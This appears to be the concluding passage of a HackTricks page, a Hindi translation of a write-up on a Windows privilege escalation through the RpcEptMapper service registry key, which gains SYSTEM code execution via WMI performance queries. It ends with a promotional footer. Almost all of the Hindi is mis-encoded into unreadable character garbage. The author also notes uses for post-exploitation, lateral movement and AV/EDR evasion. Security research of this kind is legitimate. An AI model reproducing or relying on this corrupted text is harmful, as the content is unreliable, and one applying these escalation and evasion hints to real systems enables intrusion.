рдореБрдЭреЗ `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ `NETWORK SERVICE` рдХреЗ рд░реВрдк рдореЗрдВ рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЙрдореНрдореАрдж рдереА, рд▓реЗрдХрд┐рди, рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдореБрдЭреЗ рдЕрдкреЗрдХреНрд╖рд╛ рд╕реЗ рдХрд╣реАрдВ рдмреЗрд╣рддрд░ рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓рд╛ рд╣реИред рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `WMI` рд╕реЗрд╡рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛, рдЬреЛ `LOCAL SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреА рд╣реИред рдпрд╣ рдХрд┐рддрдирд╛ рдЕрджреНрднреБрдд рд╣реИ рдирд╛?! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **рдзреНрдпрд╛рди рджреЗрдВ:** рдЕрдЧрд░ рдореБрдЭреЗ `NETWORK SERVICE` рдХреЗ рд░реВрдк рдореЗрдВ рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдорд┐рд▓рд╛ рд╣реЛрддрд╛, рддреЛ рдореИрдВ рдЬреЗрдореНрд╕ рдлреЛрд░реНрд╢реЙ рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдорд╣реАрдиреЗ рдкрд╣рд▓реЗ рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рдЪрд╛рд▓ рдХреА рдмрджреМрд▓рдд `LOCAL SYSTEM` рдЦрд╛рддреЗ рд╕реЗ рдХреЗрд╡рд▓ рдПрдХ рдЯреЛрдХрди рджреВрд░ рд╣реЛрддрд╛: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

рдореИрдВрдиреЗ рдкреНрд░рддреНрдпреЗрдХ WMI рдХреНрд▓рд╛рд╕ рдХреЛ рдЕрд▓рдЧ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рднреА рдХреЛрд╢рд┐рд╢ рдХреА рдФрд░ рдореИрдВрдиреЗ рдмрд┐рд▓реНрдХреБрд▓ рд╡рд╣реА рдкрд░рд┐рдгрд╛рдо рджреЗрдЦрд╛ред
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## рдирд┐рд╖реНрдХрд░реНрд╖ <a href="#conclusion" id="conclusion"></a>

рдореБрдЭреЗ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рднреЗрджреНрдпрддрд╛ рдЗрддрдиреЗ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдХреИрд╕реЗ рдЕрдирджреЗрдЦреА рдЧрдИред рдПрдХ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рд╢рд╛рдпрдж рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдкреВрд░реНрдг рд▓реЗрдЦрди рдкрд╣реБрдБрдЪ рдХреА рддрд▓рд╛рд╢ рдХрд░рддреЗ рдереЗ, рдЬрдмрдХрд┐ `AppendData/AddSubdirectory` рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдерд╛ред "рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди" рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ, рдореИрдВ рдорд╛рдиреВрдВрдЧрд╛ рдХрд┐ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрд░рд╣ рд╕реЗрдЯ рдХреА рдЧрдИ рдереА, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдореИрдВ рдХрд┐рд╕реА рднреА рдареЛрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ рд╕реЛрдЪ рд╕рдХрддрд╛ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрдИ рднреА рдЕрдиреБрдорддрд┐ рд╣реЛред

рдореИрдВрдиреЗ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рднреЗрджреНрдпрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рджреЛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд▓рд┐рдпрд╛ред рдкрд╣рд▓рд╛ рдпрд╣ рд╣реИ рдХрд┐ рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХрд░ рджрд┐рдпрд╛ рдерд╛ - рдмрд┐рдирд╛ рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЗрд╕реЗ рдорд╣рд╕реВрд╕ рдХрд┐рдП - рдЬрд┐рд╕ рджрд┐рди рдореИрдВрдиреЗ `GetModfiableRegistryPath` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдореЗрд░реА PrivescCheck рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдерд╛, рдЬреЛ рдХрдИ рдорд╣реАрдиреЗ рдкрд╣рд▓реЗ рдерд╛ред рджреВрд╕рд░рд╛ рдпрд╣ рд╣реИ рдХрд┐ рдкреНрд░рднрд╛рд╡ рдХрдо рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рдкрд╣реБрдБрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдпрд╣ рдХреЗрд╡рд▓ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ Windows рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рд╕рдорд░реНрдерди рдЕрдм рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рддрдХ рдЖрдкрдиреЗ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╕рдорд░реНрдерди рдирд╣реАрдВ рдЦрд░реАрджрд╛ рд╣реИ...). рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рдпрджрд┐ рдЖрдк рдЕрднреА рднреА Windows 7 / Server 2008 R2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдмрд┐рдирд╛ рдЗрди рдорд╢реАрдиреЛрдВ рдХреЛ рдкрд╣рд▓реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдареАрдХ рд╕реЗ рдЕрд▓рдЧ рдХрд┐рдП, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рд░реЛрдХрдирд╛ рд╢рд╛рдпрдж рдЖрдкрдХреА рд╕рдмрд╕реЗ рдХрдо рдЪрд┐рдВрддрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред

рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд╕реБрд░рдХреНрд╖рд╛ рднреЗрджреНрдпрддрд╛ рдХреЗ рдЙрдкрд╛рдЦреНрдпрд╛рдиреА рдкрдХреНрд╖ рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ "Perfomance" рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗрдЯрд┐рдВрдЧ рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди, рд▓реЗрдЯрд░рд▓ рдореВрд╡рдореЗрдВрдЯ рдФрд░ AV/EDR рдЗрд╡реЗрдЬрд╝рди рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЕрд╡рд╕рд░ рдЦреЛрд▓рддреА рд╣реИред рдореЗрд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рджреГрд╢реНрдп рд╣реИрдВ рд▓реЗрдХрд┐рди рдореИрдВрдиреЗ рдЕрднреА рддрдХ рдЙрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХрд╛ рднреА рдкрд░реАрдХреНрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИред рдЬрд╛рд░реА рд░рдЦреЗрдВ?...

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family)
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
